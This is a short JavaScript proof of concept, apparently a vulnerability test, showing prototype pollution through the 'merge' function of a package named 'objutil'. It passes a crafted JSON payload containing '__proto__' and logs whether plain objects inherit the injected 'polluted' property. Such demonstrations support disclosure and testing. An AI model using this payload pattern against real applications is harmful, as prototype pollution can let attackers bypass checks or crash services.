var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const {merge, remove} = require('objutil');
let a = {
    x: 1,
    y: {
        w: 1,
        z: 2
    }
};
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
result = merge(a, JSON.parse(malicious_payload));
console.log({}.polluted);